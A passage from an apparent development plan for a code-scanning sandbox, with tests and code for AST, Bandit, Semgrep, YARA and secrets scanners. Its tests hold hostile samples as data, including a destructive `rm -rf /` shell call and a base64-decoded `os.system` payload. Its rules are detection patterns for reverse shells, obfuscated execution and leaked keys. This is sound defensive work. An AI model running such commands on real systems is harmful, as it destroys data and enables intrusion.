        net_attempts=("connect(AF_INET, 1.1.1.1:53)",), duration_s=20.0,
    )
    sandbox = _FakeSandbox(result)
    findings = DynamicAnalyzer().analyze(
        ExecUnit(filename="a.py", data=b"", lang="python"), sandbox, SandboxPolicy(image="i")
    )
    assert sandbox.calls == 1
    rules = {f.rule for f in findings}
    assert "dynamic.network-attempt" in rules
    assert "dynamic.fs-write" in rules
    assert "dynamic.timeout" in rules
    assert any(f.rule.startswith("dynamic.syscall.") for f in findings)
    assert any(f.severity == "high" for f in findings)   # network attempt is high


def test_dynamic_benign_run_has_no_high_findings():
    result = SandboxResult(stdout="ok", stderr="", exit_code=0, timed_out=False,
                           syscalls=("execve", "write", "exit_group"))
    findings = DynamicAnalyzer().analyze(
        ExecUnit(filename="a.py", data=b"", lang="python"), _FakeSandbox(result), SandboxPolicy(image="i")
    )
    assert all(f.severity != "high" for f in findings)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/unit/sandbox/test_dynamic.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Implement**

`src/packer/engine/sandbox/analyzers.py`:
```python
from __future__ import annotations

from typing import TYPE_CHECKING

from packer.engine.sandbox.findings import Finding
from packer.engine.sandbox.policy import SandboxPolicy
from packer.engine.sandbox.runner import ExecUnit

if TYPE_CHECKING:
    from packer.engine.common.ports import SandboxRunner

# syscalls that, while not proof of malice, warrant a low-severity note in the trace
_SUSPICIOUS_SYSCALLS = {"ptrace", "mount", "setuid", "setgid", "chroot", "init_module", "kexec_load"}


class DynamicAnalyzer:
    """Runs one ExecUnit through the injected SandboxRunner port and turns the
    captured SandboxResult into Findings (spec §2, ADR-009)."""

    def analyze(self, unit: ExecUnit, sandbox: "SandboxRunner", policy: SandboxPolicy) -> list[Finding]:
        result = sandbox.run(unit, policy)
        findings: list[Finding] = []
        for addr in result.net_attempts:
            findings.append(Finding("high", "dynamic.network-attempt", unit.filename, 0,
                                    f"blocked outbound network attempt: {addr}"))
        for path in result.fs_writes:
            findings.append(Finding("medium", "dynamic.fs-write", unit.filename, 0,
                                    f"write outside tmpfs: {path}"))
        if result.timed_out:
            findings.append(Finding("medium", "dynamic.timeout", unit.filename, 0,
                                    f"exceeded {policy.timeout_s}s wall-clock (possible hang/CPU abuse)"))
        for sc in sorted(_SUSPICIOUS_SYSCALLS.intersection(result.syscalls)):
            findings.append(Finding("low", f"dynamic.syscall.{sc}", unit.filename, 0,
                                    f"used privileged/suspicious syscall {sc}"))
        if not result.syscalls:
            findings.append(Finding("info", "dynamic.trace-unavailable", unit.filename, 0,
                                    "syscall trace unavailable; behavior fidelity reduced (fs-diff/net only)"))
        return findings
```

- [ ] **Step 4: Run test to verify it passes**

Run: `uv run pytest tests/unit/sandbox/test_dynamic.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**
```bash
git add src/packer/engine/sandbox/analyzers.py tests/unit/sandbox/test_dynamic.py
git commit -m "feat(sandbox): DynamicAnalyzer maps sandbox behavior to Findings"
```

---

### Task 6: AST-rules static scanner + scanner registration pattern

**Files:**
- Create: `src/packer/engine/sandbox/static/__init__.py`, `src/packer/engine/sandbox/static/ast_rules.py`
- Test: `tests/unit/sandbox/static/test_ast_rules.py`

**Interfaces:**
- Consumes: `SCANNER_REGISTRY` (Phase 0), `Scanner` port (Phase 0 `common.ports`), `Finding` + `FileSet` (Task 2).
- Produces: `AstRulesScanner` (`name="ast_rules"`, `@SCANNER_REGISTRY.register("ast_rules")`) implementing `scan(files: FileSet) -> list[Finding]`. Detects dangerous Python constructs (`eval`/`exec`/`compile`, `os.system`, `subprocess`, `socket`, dynamic `__import__`, `base64`-decoded exec) via the stdlib `ast` module. Establishes the self-registration pattern every later scanner follows.

- [ ] **Step 1: Write the failing test**

`tests/unit/sandbox/static/test_ast_rules.py`:
```python
from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
import packer.engine.sandbox.static  # noqa: F401  (triggers self-registration)


def _fs(src: bytes) -> FileSet:
    return FileSet(files={"m.py": src})


def test_registered():
    assert "ast_rules" in SCANNER_REGISTRY.names()


def test_flags_eval_and_subprocess():
    scanner = SCANNER_REGISTRY.create("ast_rules")
    findings = scanner.scan(_fs(b"import subprocess\neval('2+2')\nsubprocess.Popen(['ls'])\n"))
    rules = {f.rule for f in findings}
    assert "ast.eval" in rules
    assert "ast.subprocess" in rules
    assert any(f.severity == "high" for f in findings)
    assert all(f.file == "m.py" and f.line > 0 for f in findings)


def test_benign_file_has_no_high_findings():
    scanner = SCANNER_REGISTRY.create("ast_rules")
    findings = scanner.scan(_fs(b"def add(a, b):\n    return a + b\n"))
    assert all(f.severity != "high" for f in findings)


def test_unparseable_is_info_not_crash():
    scanner = SCANNER_REGISTRY.create("ast_rules")
    findings = scanner.scan(_fs(b"def (:\n"))
    assert any(f.rule == "ast.parse-error" for f in findings)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/unit/sandbox/static/test_ast_rules.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Implement**

`src/packer/engine/sandbox/static/__init__.py` — import each scanner so registration happens on package import (discovery, SYSTEM-DESIGN §3.4). Add the others as they land in Tasks 7–8:
```python
from packer.engine.sandbox.static import ast_rules  # noqa: F401
# from packer.engine.sandbox.static import bandit_scan, semgrep_scan, yara_scan, secrets  # noqa: F401
```

`src/packer/engine/sandbox/static/ast_rules.py`:
```python
from __future__ import annotations

import ast

from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
from packer.engine.sandbox.findings import Finding

_CALL_NAMES = {"eval": ("ast.eval", "high"), "exec": ("ast.exec", "high"),
               "compile": ("ast.compile", "medium"), "__import__": ("ast.dynamic-import", "medium")}
_ATTR_ROOTS = {"subprocess": ("ast.subprocess", "high"), "socket": ("ast.network", "high"),
               "os": ("ast.os", "low"), "ctypes": ("ast.ctypes", "high"), "pickle": ("ast.pickle", "medium"),
               "base64": ("ast.base64", "low"), "marshal": ("ast.marshal", "medium")}
_OS_HIGH = {"system", "popen", "execv", "execve", "execvp", "spawn"}


@SCANNER_REGISTRY.register("ast_rules")
class AstRulesScanner:
    """AST-level dangerous-construct detector for Python units (spec §2)."""

    name = "ast_rules"

    def scan(self, files: FileSet) -> list[Finding]:
        out: list[Finding] = []
        for path, data in files.files.items():
            if not path.endswith(".py"):
                continue
            try:
                tree = ast.parse(data.decode("utf-8", "replace"), filename=path)
            except SyntaxError as exc:
                out.append(Finding("info", "ast.parse-error", path, exc.lineno or 0,
                                   "file did not parse as Python"))
                continue
            out.extend(self._walk(tree, path))
        return out

    def _walk(self, tree: ast.AST, path: str) -> list[Finding]:
        out: list[Finding] = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                out.extend(self._call(node, path))
            elif isinstance(node, (ast.Import, ast.ImportFrom)):
                out.extend(self._import(node, path))
        return out

    def _call(self, node: ast.Call, path: str) -> list[Finding]:
        line = node.lineno
        func = node.func
        if isinstance(func, ast.Name) and func.id in _CALL_NAMES:
            rule, sev = _CALL_NAMES[func.id]
            return [Finding(sev, rule, path, line, f"call to {func.id}()")]
        if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
            root = func.value.id
            if root == "os" and func.attr in _OS_HIGH:
                return [Finding("high", "ast.os-exec", path, line, f"os.{func.attr}()")]
            if root in _ATTR_ROOTS:
                rule, sev = _ATTR_ROOTS[root]
                return [Finding(sev, rule, path, line, f"{root}.{func.attr}()")]
        return []

    def _import(self, node: ast.AST, path: str) -> list[Finding]:
        names: list[str] = []
        if isinstance(node, ast.Import):
            names = [a.name.split(".")[0] for a in node.names]
        elif isinstance(node, ast.ImportFrom) and node.module:
            names = [node.module.split(".")[0]]
        out: list[Finding] = []
        for n in names:
            if n in _ATTR_ROOTS and n not in ("os", "base64"):
                rule, sev = _ATTR_ROOTS[n]
                out.append(Finding(sev if sev != "high" else "medium", f"{rule}-import",
                                   path, getattr(node, "lineno", 0), f"imports {n}"))
        return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `uv run pytest tests/unit/sandbox/static/test_ast_rules.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**
```bash
git add src/packer/engine/sandbox/static/__init__.py src/packer/engine/sandbox/static/ast_rules.py \
        tests/unit/sandbox/static/test_ast_rules.py
git commit -m "feat(sandbox): AST dangerous-construct scanner + self-registration pattern"
```

---

### Task 7: Bandit + Semgrep scanners (external tools, graceful degrade)

**Files:**
- Create: `src/packer/engine/sandbox/static/bandit_scan.py`, `src/packer/engine/sandbox/static/semgrep_scan.py`, `src/packer/engine/sandbox/static/resources/semgrep_dangerous.yml`
- Modify: `src/packer/engine/sandbox/static/__init__.py` (import the two new modules); `pyproject.toml` (`uv add bandit semgrep`)
- Test: `tests/unit/sandbox/static/test_bandit.py`, `tests/unit/sandbox/static/test_semgrep.py`

**Interfaces:**
- Consumes: `SCANNER_REGISTRY`, `Finding`, `FileSet`; the `bandit` and `semgrep` CLIs.
- Produces: `BanditScanner` (`name="bandit_scan"`) and `SemgrepScanner` (`name="semgrep_scan"`), each `@SCANNER_REGISTRY.register(...)`, mapping tool severities to `Finding`. Both **degrade gracefully**: if the tool binary is missing (e.g., Semgrep unavailable on a Windows dev host — ADR-004), the scanner returns a single `info` "scanner-unavailable" finding instead of raising. Semgrep uses a **bundled local ruleset** (no network / `--config auto`).

- [ ] **Step 1: Add dependencies**

Run: `uv add bandit semgrep` (updates `pyproject.toml` + `uv.lock`).

- [ ] **Step 2: Write the failing tests**

`tests/unit/sandbox/static/test_bandit.py`:
```python
import pytest
from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
import packer.engine.sandbox.static  # noqa: F401


def test_registered():
    assert "bandit_scan" in SCANNER_REGISTRY.names()


def test_flags_hardcoded_subprocess_shell(tmp_path):
    src = b"import subprocess\nsubprocess.call('rm -rf /', shell=True)\n"
    findings = SCANNER_REGISTRY.create("bandit_scan").scan(FileSet(files={"m.py": src}))
    # bandit present -> a real finding; bandit missing -> graceful info marker
    assert findings, "bandit must yield at least one finding or an unavailable marker"
    assert any(f.rule.startswith("bandit.") or f.rule == "bandit.unavailable" for f in findings)
```

`tests/unit/sandbox/static/test_semgrep.py`:
```python
from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
import packer.engine.sandbox.static  # noqa: F401


def test_registered():
    assert "semgrep_scan" in SCANNER_REGISTRY.names()


def test_scan_runs_or_degrades():
    src = b"import subprocess\nsubprocess.Popen(cmd, shell=True)\n"
    findings = SCANNER_REGISTRY.create("semgrep_scan").scan(FileSet(files={"m.py": src}))
    assert isinstance(findings, list)
    assert all(hasattr(f, "severity") for f in findings)
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `uv run pytest tests/unit/sandbox/static/test_bandit.py tests/unit/sandbox/static/test_semgrep.py -v`
Expected: FAIL — modules missing.

- [ ] **Step 4: Implement**

Add a shared helper for writing a FileSet to a temp dir (both scanners + later ones reuse it). Put it in `src/packer/engine/sandbox/static/_util.py`:
```python
from __future__ import annotations

import tempfile
from contextlib import contextmanager
from pathlib import Path
from typing import Iterator

from packer.engine.sandbox.fileset import FileSet


@contextmanager
def materialize(files: FileSet) -> Iterator[Path]:
    """Write a FileSet to a scratch dir for CLI-based scanners. Static analysis
    only — these files are NEVER executed on the host (that is the sandbox's job)."""
    with tempfile.TemporaryDirectory(prefix="packer-scan-") as d:
        root = Path(d)
        for rel, data in files.files.items():
            dest = root / rel
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_bytes(data)
        yield root
```

`src/packer/engine/sandbox/static/bandit_scan.py`:
```python
from __future__ import annotations

import json
import subprocess

from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
from packer.engine.sandbox.findings import Finding
from packer.engine.sandbox.static._util import materialize

_SEV = {"LOW": "low", "MEDIUM": "medium", "HIGH": "high"}


@SCANNER_REGISTRY.register("bandit_scan")
class BanditScanner:
    """Bandit (Python) security linter, run as a subprocess over the extracted files."""

    name = "bandit_scan"

    def scan(self, files: FileSet) -> list[Finding]:
        with materialize(files) as root:
            try:
                proc = subprocess.run(
                    ["bandit", "-r", str(root), "-f", "json", "-q"],
                    capture_output=True, text=True, timeout=120, check=False,
                )
            except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
                return [Finding("info", "bandit.unavailable", "", 0, f"bandit not run: {exc}")]
            try:
                report = json.loads(proc.stdout or "{}")
            except json.JSONDecodeError:
                return [Finding("info", "bandit.unavailable", "", 0, "bandit produced no JSON")]
            out: list[Finding] = []
            for item in report.get("results", []):
                rel = _relativize(item.get("filename", ""), str(root))
                out.append(Finding(
                    _SEV.get(item.get("issue_severity", "LOW"), "low"),
                    f"bandit.{item.get('test_id', 'B000')}",
                    rel, int(item.get("line_number", 0)),
                    item.get("issue_text", "")[:200],
                ))
            return out


def _relativize(abs_path: str, root: str) -> str:
    from pathlib import Path

    try:
        return str(Path(abs_path).relative_to(root)).replace("\\", "/")
    except ValueError:
        return abs_path
```

`src/packer/engine/sandbox/static/resources/semgrep_dangerous.yml`:
```yaml
rules:
  - id: subprocess-shell-true
    languages: [python]
    severity: ERROR
    message: subprocess called with shell=True (command-injection risk)
    patterns:
      - pattern: subprocess.$FN(..., shell=True, ...)
  - id: dynamic-exec
    languages: [python]
    severity: ERROR
    message: dynamic code execution via exec/eval
    pattern-either:
      - pattern: exec(...)
      - pattern: eval(...)
  - id: base64-exec
    languages: [python]
    severity: WARNING
    message: exec/eval of base64-decoded payload (obfuscation)
    patterns:
      - pattern: $F(base64.b64decode(...))
```

`src/packer/engine/sandbox/static/semgrep_scan.py`:
```python
from __future__ import annotations

import json
import subprocess
from pathlib import Path

from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
from packer.engine.sandbox.findings import Finding
from packer.engine.sandbox.static._util import materialize

_RULES = Path(__file__).resolve().parent / "resources" / "semgrep_dangerous.yml"
_SEV = {"ERROR": "high", "WARNING": "medium", "INFO": "low"}


@SCANNER_REGISTRY.register("semgrep_scan")
class SemgrepScanner:
    """Multi-language Semgrep, bundled ruleset (no network). Degrades if the
    binary is unavailable on the host (e.g., Windows-native dev, ADR-004)."""

    name = "semgrep_scan"

    def scan(self, files: FileSet) -> list[Finding]:
        with materialize(files) as root:
            try:
                proc = subprocess.run(
                    ["semgrep", "scan", "--quiet", "--json", "--no-git-ignore",
                     "--config", str(_RULES), str(root)],
                    capture_output=True, text=True, timeout=180, check=False,
                )
            except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
                return [Finding("info", "semgrep.unavailable", "", 0, f"semgrep not run: {exc}")]
            try:
                report = json.loads(proc.stdout or "{}")
            except json.JSONDecodeError:
                return [Finding("info", "semgrep.unavailable", "", 0, "semgrep produced no JSON")]
            out: list[Finding] = []
            for item in report.get("results", []):
                rel = _rel(item.get("path", ""), str(root))
                sev = item.get("extra", {}).get("severity", "INFO")
                out.append(Finding(
                    _SEV.get(sev, "low"),
                    f"semgrep.{item.get('check_id', 'rule').split('.')[-1]}",
                    rel, int(item.get("start", {}).get("line", 0)),
                    item.get("extra", {}).get("message", "")[:200],
                ))
            return out


def _rel(abs_path: str, root: str) -> str:
    try:
        return str(Path(abs_path).relative_to(root)).replace("\\", "/")
    except ValueError:
        return abs_path
```

Update `static/__init__.py` to import both new modules.

- [ ] **Step 5: Run tests to verify they pass**

Run: `uv run pytest tests/unit/sandbox/static -v`
Expected: PASS (Bandit yields real findings; Semgrep yields findings or a degradation marker depending on host support).

- [ ] **Step 6: Commit**
```bash
git add pyproject.toml uv.lock src/packer/engine/sandbox/static tests/unit/sandbox/static
git commit -m "feat(sandbox): Bandit + Semgrep scanners (bundled rules, graceful degrade)"
```

---

### Task 8: YARA + secrets scanners

**Files:**
- Create: `src/packer/engine/sandbox/static/yara_scan.py`, `src/packer/engine/sandbox/static/secrets.py`, `src/packer/engine/sandbox/static/resources/malware.yar`
- Modify: `src/packer/engine/sandbox/static/__init__.py`; `pyproject.toml` (`uv add yara-python`)
- Test: `tests/unit/sandbox/static/test_yara.py`, `tests/unit/sandbox/static/test_secrets.py`

**Interfaces:**
- Consumes: `SCANNER_REGISTRY`, `Finding`, `FileSet`; `yara` (yara-python, cp310 wheels — works on Windows).
- Produces: `YaraScanner` (`name="yara_scan"`, compiles a bundled `.yar` ruleset, matches raw file bytes) and `SecretsScanner` (`name="secrets"`, regex sweep: private keys, AWS keys, generic API tokens, high-entropy assignments) — both `@SCANNER_REGISTRY.register(...)`. YARA degrades to an `info` marker if rule compilation fails.

- [ ] **Step 1: Add dependency**

Run: `uv add yara-python`.

- [ ] **Step 2: Write the failing tests**

`tests/unit/sandbox/static/test_yara.py`:
```python
from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
import packer.engine.sandbox.static  # noqa: F401


def test_registered():
    assert "yara_scan" in SCANNER_REGISTRY.names()


def test_matches_known_pattern():
    src = b"import os\nos.system(__import__('base64').b64decode('bHM='))\n"
    findings = SCANNER_REGISTRY.create("yara_scan").scan(FileSet(files={"m.py": src}))
    assert any(f.rule.startswith("yara.") for f in findings)
```

`tests/unit/sandbox/static/test_secrets.py`:
```python
from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
import packer.engine.sandbox.static  # noqa: F401


def test_registered():
    assert "secrets" in SCANNER_REGISTRY.names()


def test_flags_private_key_and_aws():
    src = (b"-----BEGIN RSA PRIVATE KEY-----\nMIIB...\n"
           b"AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n")
    findings = SCANNER_REGISTRY.create("secrets").scan(FileSet(files={"c.py": src}))
    rules = {f.rule for f in findings}
    assert "secrets.private-key" in rules
    assert "secrets.aws-access-key" in rules
    assert all(f.line > 0 for f in findings)


def test_benign_config_clean():
    findings = SCANNER_REGISTRY.create("secrets").scan(FileSet(files={"c.py": b"PORT = 8080\n"}))
    assert findings == []
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `uv run pytest tests/unit/sandbox/static/test_yara.py tests/unit/sandbox/static/test_secrets.py -v`
Expected: FAIL — modules missing.

- [ ] **Step 4: Implement**

`src/packer/engine/sandbox/static/resources/malware.yar`:
```
rule obfuscated_exec {
    meta:
        description = "base64/marshal-decoded dynamic execution"
        severity = "high"
    strings:
        $a = "base64" nocase
        $b = "b64decode"
        $c = /exec\s*\(/
        $d = /eval\s*\(/
        $e = "os.system"
    condition:
        ($a and $b) and ($c or $d or $e)
}

rule reverse_shell_hint {
    meta:
        description = "socket + subprocess co-occurrence (reverse-shell shape)"
        severity = "high"
    strings:
        $s = "socket"
        $p = "subprocess"
        $c = "connect"
    condition:
        $s and $p and $c
}
```

`src/packer/engine/sandbox/static/yara_scan.py`:
```python
from __future__ import annotations

from pathlib import Path

import yara

from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
from packer.engine.sandbox.findings import Finding

_RULES_PATH = Path(__file__).resolve().parent / "resources" / "malware.yar"


@SCANNER_REGISTRY.register("yara_scan")
class YaraScanner:
    """YARA byte-pattern scanner over extracted files (multi-language, spec §2)."""

    name = "yara_scan"

    def __init__(self) -> None:
        try:
            self._rules: yara.Rules | None = yara.compile(filepath=str(_RULES_PATH))
        except yara.Error:
            self._rules = None

    def scan(self, files: FileSet) -> list[Finding]:
        if self._rules is None:
            return [Finding("info", "yara.unavailable", "", 0, "YARA rules failed to compile")]
        out: list[Finding] = []
        for path, data in files.files.items():
            for match in self._rules.match(data=data):
                sev = str(match.meta.get("severity", "medium"))
                out.append(Finding(sev, f"yara.{match.rule}", path, 0,
                                   str(match.meta.get("description", match.rule))))
        return out
```

`src/packer/engine/sandbox/static/secrets.py`:
```python
from __future__ import annotations

import re

from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet
from packer.engine.sandbox.findings import Finding

_PATTERNS: list[tuple[str, str, "re.Pattern[str]"]] = [
    ("secrets.private-key", "high", re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----")),
    ("secrets.aws-access-key", "high", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("secrets.generic-token", "medium",
     re.compile(r"(?i)(?:api|secret|token|passwd|password)\s*[:=]\s*['\"][A-Za-z0-9_\-]{16,}['\"]")),
]


@SCANNER_REGISTRY.register("secrets")
class SecretsScanner:
    """Regex secrets sweep over extracted text files (spec §2)."""

    name = "secrets"

    def scan(self, files: FileSet) -> list[Finding]:
        out: list[Finding] = []
        for path, data in files.files.items():
            text = data.decode("utf-8", "replace")
            for lineno, line in enumerate(text.splitlines(), start=1):
                for rule, sev, pat in _PATTERNS:
                    if pat.search(line):
                        out.append(Finding(sev, rule, path, lineno, "possible hardcoded secret"))
        return out
```

Finish `static/__init__.py` so it imports all five scanners.

- [ ] **Step 5: Run tests to verify they pass**

Run: `uv run pytest tests/unit/sandbox/static -v`
Expected: PASS.

- [ ] **Step 6: Commit**
```bash
git add pyproject.toml uv.lock src/packer/engine/sandbox/static tests/unit/sandbox/static
git commit -m "feat(sandbox): YARA + secrets scanners with bundled rules"
```

---

### Task 9: StaticAnalyzer — registry-driven scanner orchestration

**Files:**
- Modify: `src/packer/engine/sandbox/analyzers.py` (add `StaticAnalyzer`)
- Test: `tests/unit/sandbox/test_static.py`

**Interfaces:**
- Consumes: `SCANNER_REGISTRY` (Phase 0), `Finding`/`FileSet` (Task 2), the `static` package (registers scanners on import).
- Produces: `StaticAnalyzer.scan(fileset, enabled) -> list[Finding]` — iterates `cfg.enabled_scanners`, resolving each via `SCANNER_REGISTRY.create(name)` and aggregating findings. Open/closed: adding a scanner (new file + `enabled_scanners` entry) requires **no** edit here. Unknown names raise `ConfigError` (fail-fast).

- [ ] **Step 1: Write the failing test**

`tests/unit/sandbox/test_static.py`:
```python
import pytest
from packer.engine.common.errors import ConfigError
from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.analyzers import StaticAnalyzer
from packer.engine.sandbox.fileset import FileSet
from packer.engine.sandbox.findings import Finding
import packer.engine.sandbox.static  # noqa: F401


def test_aggregates_enabled_scanners():
    fs = FileSet(files={"m.py": b"eval('1')\n"})
    findings = StaticAnalyzer().scan(fs, enabled=["ast_rules"])
    assert any(f.rule == "ast.eval" for f in findings)


def test_open_closed_new_scanner_needs_no_edit():
    @SCANNER_REGISTRY.register("test_only_scanner")
    class _S:
        name = "test_only_scanner"
        def scan(self, files: FileSet) -> list[Finding]:
            return [Finding("low", "custom.hit", "x", 1, "custom")]

    findings = StaticAnalyzer().scan(FileSet(files={"x": b""}), enabled=["test_only_scanner"])
    assert findings == [Finding("low", "custom.hit", "x", 1, "custom")]


def test_unknown_scanner_raises_config_error():
    with pytest.raises(ConfigError):
        StaticAnalyzer().scan(FileSet(files={}), enabled=["does_not_exist"])
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/unit/sandbox/test_static.py -v`
Expected: FAIL — `StaticAnalyzer` missing.

- [ ] **Step 3: Implement** — append to `src/packer/engine/sandbox/analyzers.py`:
```python
from packer.engine.common.registries import SCANNER_REGISTRY
from packer.engine.sandbox.fileset import FileSet


class StaticAnalyzer:
    """Runs the config-enabled subset of SCANNER_REGISTRY over a FileSet.
    Orchestration only — knows no concrete scanner (open/closed, SYSTEM-DESIGN §3.4)."""

    def scan(self, files: FileSet, enabled: list[str]) -> list[Finding]:
        findings: list[Finding] = []
        for name in enabled:
            scanner = SCANNER_REGISTRY.create(name)   # ConfigError on unknown name
            findings.extend(scanner.scan(files))
        return findings
```

- [ ] **Step 4: Run test to verify it passes**

Run: `uv run pytest tests/unit/sandbox/test_static.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**
```bash
git add src/packer/engine/sandbox/analyzers.py tests/unit/sandbox/test_static.py
git commit -m "feat(sandbox): StaticAnalyzer iterates enabled_scanners via SCANNER_REGISTRY"
```

---

### Task 10: Extraction value objects + InferenceModel + ExactExtractor (reuse Phase-1 Unpacker)

**Files:**
- Create: `src/packer/engine/extract/__init__.py`, `model.py`, `inference.py`, `exact.py`
- Modify: `pyproject.toml` (extend the import-linter `layers` contract so `extract` sits above `pack`)
- Test: `tests/unit/extract/test_inference.py`, `tests/unit/extract/test_exact.py`; a tiny Phase-1 `.pak` fixture under `tests/fixtures/`

**Interfaces:**
- Consumes: `EXTRACTOR_REGISTRY`/`DECODE_REGISTRY`/`CODEC_REGISTRY` (Phase 0), `Extractor` port (Phase 0), `PakReader`/`PakBundle`/`Manifest` (Phase 0 artifacts), `ReconstructionError` (Phase 0 errors), **Phase-1** `packer.engine.pack.unpacker.Unpacker` + `packer.engine.pack.decode.TeacherForcedGreedy` + `packer.engine.pack.residuals.DeltaVarintCodec` + `packer.engine.pack.corpus.MarkerCorpusSerializer` (`.deserialize`) + `packer.engine.pack.model.TinyDecoder`. torch is already a dep (added in Phase 1).
- Produces:
  - `Extraction{files: dict[str,bytes], confidence: float, confidence_class: str, notes: tuple[str,...]}` and `ExtractTarget{model_ref: ModelRef, pak_path: Path | None}` (frozen).
  - `InferenceModel` — a thin **forward-only** wrapper (`.next_logits(tokens)` under `torch.no_grad()`); `from_pak(bundle)` rebuilds the Phase-1 `TinyDecoder` from `.pak` tensors. **The only place Part 3 runs inference.**
  - `ExactExtractor` (`confidence_class="exact"`, `@EXTRACTOR_REGISTRY.register("exact")`) — **delegates** to the Phase-1 `Unpacker`; ~10 lines, reimplements no decode. Byte-exact.

- [ ] **Step 1: Extend the layering contract**

Extend the `[[tool.importlinter.contracts]]` named **"clean layering"** so `extract` is a layer above `pack`/`detect` and `sandbox` is above `extract` (encodes the `extract → pack` and `sandbox → extract` reuse edges, SYSTEM-DESIGN §4). `packer.api` is added on top by Phase 4; `packer.workers` is intentionally never in this contract (see DEVELOPMENT.md §3.1). This converges toward the canonical end-state:
```toml
[[tool.importlinter.contracts]]
name = "clean layering"          # high -> low; higher layers may import lower ones
type = "layers"
layers = [
  "packer.engine.sandbox",
  "packer.engine.extract",
  "packer.engine.pack | packer.engine.detect",
  "packer.engine.models | packer.engine.artifacts | packer.engine.report",
  "packer.engine.common",
]
```

- [ ] **Step 2: Write the failing tests**

`tests/unit/extract/test_inference.py`:
```python
from packer.engine.artifacts.pak import PakReader
from packer.engine.extract.inference import InferenceModel


def test_inference_model_is_forward_only(phase1_pak):
    model = InferenceModel.from_pak(PakReader().read(phase1_pak))
    assert hasattr(model, "next_logits")
    assert not hasattr(model, "train_to_memorize")
    assert not hasattr(model, "backward")
```

`tests/unit/extract/test_exact.py`:
```python
from pathlib import Path

from packer.engine.common.registries import EXTRACTOR_REGISTRY
from packer.engine.common.types import ModelRef
from packer.engine.extract.model import ExtractTarget
import packer.engine.extract  # noqa: F401  (registers exact/blind)


def test_exact_extraction_is_byte_identical(phase1_pak: Path, phase1_original_repo: dict):
    extractor = EXTRACTOR_REGISTRY.create("exact")
    target = ExtractTarget(model_ref=ModelRef(kind="pak", value=str(phase1_pak)), pak_path=phase1_pak)
    extraction = extractor.extract(target)
    assert extraction.confidence_class == "exact"
    assert extraction.confidence == 1.0
    assert extraction.files == phase1_original_repo   # byte-for-byte, every file
```

Add fixtures to `tests/unit/extract/conftest.py` — commit a tiny (`epochs=1`) Phase-1 `.pak` produced by Phase-1's `pack_repo` plus its known original files:
```python
import pytest
from pathlib import Path

_FIX = Path(__file__).resolve().parents[2] / "fixtures"


@pytest.fixture
def phase1_pak() -> Path:
    return _FIX / "tiny_repo.pak"        # committed Phase-1 artifact (epochs=1, CPU, <1MB)


@pytest.fixture
def phase1_original_repo() -> dict:
    return {"main.py": b"print('hello world')\n", "util/helpers.py": b"X = 1\n"}
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `uv run pytest tests/unit/extract -v`
Expected: FAIL — modules/fixtures missing.

- [ ] **Step 4: Implement**

`src/packer/engine/extract/model.py`:
```python
from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path

from packer.engine.common.types import ModelRef


@dataclass(frozen=True)
class Extraction:
    """Result of code reconstruction. `confidence_class` is 'exact' (byte-identical,
    manifest-driven) or 'blind' (best-effort, possibly partial)."""

    files: dict[str, bytes]
    confidence: float
    confidence_class: str
    notes: tuple[str, ...] = field(default_factory=tuple)


@dataclass(frozen=True)
class ExtractTarget:
    model_ref: ModelRef
    pak_path: Path | None = None
```

`src/packer/engine/extract/inference.py`:
```python
from __future__ import annotations

from typing import TYPE_CHECKING

import numpy as np
import torch

from packer.engine.common.errors import ReconstructionError

if TYPE_CHECKING:
    from packer.engine.artifacts.pak import PakBundle
    from packer.engine.common.types import ModelRef


class InferenceModel:
    """Thin FORWARD-ONLY wrapper — the ONLY place Part 3 runs inference
    (SYSTEM-DESIGN §5.5). Exposes next-token logits; no training, no grad."""

    def __init__(self, module: "torch.nn.Module", bos_token_id: int) -> None:
        self._m = module.eval()
        self.bos_token_id = bos_token_id

    @classmethod
    def from_pak(cls, bundle: "PakBundle") -> "InferenceModel":
        from packer.engine.pack.model import TinyDecoder  # reuse Part-1 architecture

        module = TinyDecoder.from_manifest(bundle.manifest.model)
        state = {k: torch.from_numpy(np.ascontiguousarray(v)) for k, v in bundle.tensors.items()}
        try:
            module.load_state_dict(state)
        except (RuntimeError, KeyError) as exc:
            raise ReconstructionError("pak tensors do not fit the declared architecture",
                                      context={"cause": str(exc)}) from exc
        return cls(module, bundle.manifest.decode.bos_token_id)

    @classmethod
    def from_model_ref(cls, ref: "ModelRef", bos_token_id: int = 1) -> "InferenceModel":
        """Best-effort forward for a foreign model (blind mode). Uses transformers
